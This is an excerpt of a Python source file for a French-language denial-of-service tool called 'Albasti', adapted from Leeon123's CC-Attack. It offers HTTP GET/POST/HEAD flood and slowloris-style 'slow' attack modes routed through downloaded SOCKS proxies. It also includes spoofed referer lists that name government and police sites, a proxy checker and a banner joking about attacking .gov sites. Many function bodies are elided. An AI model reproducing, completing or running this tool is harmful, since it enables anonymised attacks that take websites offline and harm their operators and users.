...
----------------------------------------------------------->			
┌─────────────────────────────────────────────────────┐
│         Attaquer un .gov est risqué ! (Albasti)     │
├─────────────────────────────────────────────────────│
│                   Améliorations                     │
│   [+] Optimisation                                  │
...
│─────────────────────────────────────────────────────│
│	                                              │
│       Inspiré du CC-Attack par Leoon123             │
└─────────────────────────────────────────────────────┘
''')
...
referers = [
	...
	"https://www.ovh.com/index.html",
	"https://www.paypal.com/index.html",
	"https://www.lequipe.fr/index.html",
	"https://www.bing.com/search?q=",
	"https://www.gouvernement.fr/search/",
	"https://www.roland.com/fr/search/?q=",
	"https://www.police-nationale.interieur.gouv.fr/index.html",
	"https://www.gov.pl/index.html",
	"https://www.huawei.com/au/searchresult?keywords=",
	"https://www.apple.com/index.html",
	"https://www.samsung.com/index.html",
	"https://www.amazon.fr/s?k=&__mk_fr_FR=%C3%85M%C3%85%C5%BD%C3%95%C3%91&ref=nb_sb_noss",
	"https://www.snapchat.com/index.html",
	"https://www.riotgames.com/index.html",
	"https://www.nsa.gov/index.html",
	"https://www.nasa.gov/index.html",
	"https://www.francetvinfo.fr/index.html",
	"https://twitter.com/search?q=&src=typed_query",
	"https://www.leparisien.fr/index.html",
	"https://www.tmall.com/index.html",
	"http://www.baidu.com/index.html",
	"https://www.reddit.com/search/?q=",
	"https://www.csdn.net/index.html",
	"https://www.twitch.tv/search?term=",
	"https://www.google.co.in/search?q=",
	"https://yandex.ru/index.html",
	"https://www.tribunnews.com/search?q=",
	"http://adobe.com/index.html",
	"https://www.okezone.com/index.html",
	"http://sina.com.cn/index.html",
        "https://fr.ask.com/web?q=",
        "https://www.baidu.com/s?ie=",
        "https://www.ecosia.org/search?q=",
        "https://ecogine.org/?q=",
        "http://www.exalead.com/search/web/results/?q=",
        "https://gigablast.com/search?c=",
        ...
        "https://www.education.gouv.fr/recherche?keywords=",
        "https://store.steampowered.com/search/?term=",
        "https://duckduckgo.com/?q=",
        "https://vfstreamingfr.com/?s=",
        "https://europa.eu/search/",
        "http://www.linternaute.com/encyclopedie/recherche/id-195/?f_libelle=",
        "https://www.midilibre.fr/recherche?q=",
        "https://www.shodan.io/search?query=",
        "https://www.google.fr/search?sxsrf=",
        "https://www.google.fr/maps/search/",
        "https://www.microsoft.com/fr-fr/search?q=",
        "https://www.cdiscount.com/search/10/",
        "https://www.auchan.fr/recherche?text=",
        "https://pilot.search.dell.com/unifiedsearch/",
        "https://www.klim.com/search?keywords=",
        "https://www8.hp.com/fr/fr/home.html",
        "https://www8.hp.com/fr/fr/search/search-results.html?ajaxpage=1&jumpid=se_r1002_frfr_ac_hp#/page=1&/qt=",
        "https://www.yamaha.com/en/search/?search=",
        "https://www.ikea.com/fr/fr/search/?q=",
        "https://nl.yamaha.com/index.html",
        "https://fr.yamaha.com/index.html",
        "https://ch.yamaha.com/index.html",
        "https://cz.yamaha.com/index.html",
        "https://dk.yamaha.com/index.html",
        "https://de.yamaha.com/index.html",
        "https://es.yamaha.com/index.html",
        "https://europe.yamaha.com/index.html",
        "https://uk.yamaha.com/index.html",
        "https://it.yamaha.com/index.html",
        "https://ch.yamaha.com/index.html",
        "https://hu.yamaha.com/index.html",
        "https://no.yamaha.com/index.html",
        "https://at.yamaha.com/index.html",
        "https://pl.yamaha.com/index.html",
        "https://pt.yamaha.com/index.html",
        "https://ro.yamaha.com/index.html",
        "https://ru.yamaha.com/index.html",
        "https://cz.yamaha.com/index.html",
        "https://fi.yamaha.com/index.html",
        "https://se.yamaha.com/index.html",
        "https://tr.yamaha.com/index.html",
        "https://au.yamaha.com/index.html",
        "https://in.yamaha.com/index.html",
        "https://id.yamaha.com/index.html",
        "https://asia-latinamerica-mea.yamaha.com/index.html",
        "https://my.yamaha.com/index.html",
        "https://au.yamaha.com/index.html",
        "https://asia-latinamerica-mea.yamaha.com/index.html",
        "https://sg.yamaha.com/index.html",
        "https://kr.yamaha.com/index.html",
        "https://tw.yamaha.com/index.html",
        "https://vn.yamaha.com/index.html",
        "https://my.yamaha.com/index.html",
        "https://br.yamaha.com/index.html",
        "https://mx.yamaha.com/index.html",
        "https://mx.yamaha.com/index.html",
        "https://fr.yamaha.com/fr/search/index.html?search=",
]
ind_dict = {}
data = ""
cookies = ""
...
def GenReqHeader(method):
	...
	if method == "get" or method == "head":
		...
		accept = Choice(acceptall)
		if mode2 != "y":# Vous pouvez activer la personnalisation de données
...
def ParseUrl(original_url):
	...
	port = 80 #Valeur par défaut
	protocol = "http"
	#http(s)://www.exemple.com:1337/xxx
	if original_url[:7] == "http://":
		url = original_url[7:]
	elif original_url[:8] == "https://":
		url = original_url[8:]
		protocol = "https"
	#http(s)://www.exemple.com:1337/xxx ==> www.example.com:1337/xxx
	#print(url) #Pour debug
	tmp = url.split("/")
	website = tmp[0]#www.example.com:1337/xxx ==> www.example.com:1337
	check = website.split(":")
	if len(check) != 1:#Détecter le port
		port = int(check[1])
	else:
		if protocol == "https":
			port = 443
	target = check[0]
	if len(tmp) > 1:
		path = url.replace(website,"",1)#Obtenir le chemin www.exemple.com/xxx ==> /xxx
...
def InputOption(question,options,default):
	...
	while ans == "":
		...
		if ans == "":
			...
			print("> Veuillez entrer la bonne option")
			ans = ""
			continue
	return ans
...
def CheckerOption():
	global proxies
	N = str(input("> As-tu besoin d'une liste de socks?(y/n,default=y):"))
	if N == 'y' or N == "" :
	...
	if choice == "4":
		...
		out_file = str(input("> Nom du fichier de tes Socks5 Proxy (socks5.txt):"))
		if out_file == '':
	...
	time.sleep(0.03)
	ans = str(input("> As-tu besoin de vérifier la liste de socks?(y/n, default=y):"))
	if ans == "":
		ans = "y"
	if ans == "y":
		ms = str(input("> Délai de socks(seconds, default=1):"))
		if ms == "":
			ms = int(1)
		else :
			try:
...
def OutputToScreen(ind_rlock):
	...
	while 1:
		if i > 3:
			i = 0
		print("{:^70}".format("Statut des attaques des proxies "))
		...
		for k,v in ind_dict.items():
			...
			ind_dict[k] = 0
		ind_rlock.release()
		print("{:^70}".format(" ["+sp_char[i]+"] Albasti | Total Rps:"+str(total)))
		i+=1
		time.sleep(1)
		print("\n"*100)
	...
	while True:
		try:
			...
			if brute:
				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
			s.connect((str(target), int(port)))
			if str(port) == '443': # //Activation automatique SSL MODE :)
				ctx = ssl.SSLContext()
				s = ctx.wrap_socket(s,server_hostname=target)
			try:
				for _ in range(multiple+1):
...
def slow(conn,socks_type):
	...
	for _ in range(conn):
		try:
			...
			sys.stdout.write("[*] Running Slow Attack || Connexions: "+str(len(socket_list))+"\r")
			sys.stdout.flush()
		except:
			s.close()
	...
	while True:
		...
		for _ in range(conn - len(socket_list)):
			try:
				...
				pass
nums = 0
def checking(lines,socks_type,ms,rlock,):#Proxy checker coded by Leeon123 and taken over by Albasti
	global nums
	global proxies
...
def check_socks(ms):#Coded by Leeon123 and taken over by Albasti
	global nums
	thread_list=[]
	...
	for lines in list(proxies):
		...
		time.sleep(0.01)
		sys.stdout.write("> Les "+str(nums)+" proxies\r")
		sys.stdout.flush()
	for th in list(thread_list):
		th.join()
		sys.stdout.write("> Les "+str(nums)+" proxies\r")
		sys.stdout.flush()
	print("\r\n> Les proxies on été vérifier, Total Worked:"+str(len(proxies)))
	ans = input("> Est-ce que tu veux les enregistrés dans un fichier? (y/n, default=y)")
	if ans == "y" or ans == "":
		if choice == "4":
			...
			fp.close()
			print("> Ils ont été sauvegarder dans socks4.txt.")
		elif choice == "5":
			with open("socks5.txt", 'wb') as fp:
				for lines in list(proxies):
					fp.write(bytes(lines,encoding='utf8'))
			fp.close()
			print("> Ils ont été sauvegarder socks5.txt.")
			
def check_list(socks_file):
	print("> Liste vérifier")
...
def downloadsocks(choice):
	if choice == "4":
		...
		try:#credit to All3xJ
			...
			pass
		print("> Tu as déjà téléchargé des socks4, le nom du fichier est socks4.txt")
	if choice == "5":
		...
		try:
			...
			f.close()
		print("> Tu as déjà téléchargé des socks5, le nom du fichier est socks5.txt")
...
def main():
	...
	global cookies
	global brute
	print("> Type: [cc/post/head/slow/check]")
	mode = InputOption("> Choisis ton type (default=cc) :",["cc","post","head","slow","check"],"cc")
	url = str(input("> Mettez le lien:")).strip()
	ParseUrl(url)
	if mode == "post":
		mode2 = InputOption("> Customiser les données de publication ? (y/n, default=n):",["y","n","yes","no"],"n")
		if mode2 == "y":
			data = open(input("> Entrez l'emplacement du fichier:").strip()).readlines()
			data = ' '.join([str(txt) for txt in data])
	choice2 = InputOption("> Personnalisateur de Cookies? (y/n, default=n):",["y","n","yes","no"],"n")
	if choice2 == "y":
		cookies = str(input("Veuilez saisir les Cookies:")).strip()
	choice = InputOption("> Choisis ton type de socks(4/5, default=5):",["4","5"],"5")
	if choice == "4":
		socks_type = 4
	else:
		socks_type = 5
	if mode == "check":
		...
		return
	if mode == "slow":	
		thread_num = str(input("> Connexions(default=400):"))
	else:
	...
	if mode == "slow":
		...
		multiple = str(input("> Entrer la Magnification(default=100):"))
		if multiple == "":
			multiple = int(100)
		else:
			multiple = int(multiple)
		brute = str(input("> Activer le mode booster(y/n, default=n):"))
		if brute == "":
			brute = False
		elif brute == "y":
			brute = True
...
if __name__ == "__main__":
	main()#Coded by Leeon123 and taken over by Albasti
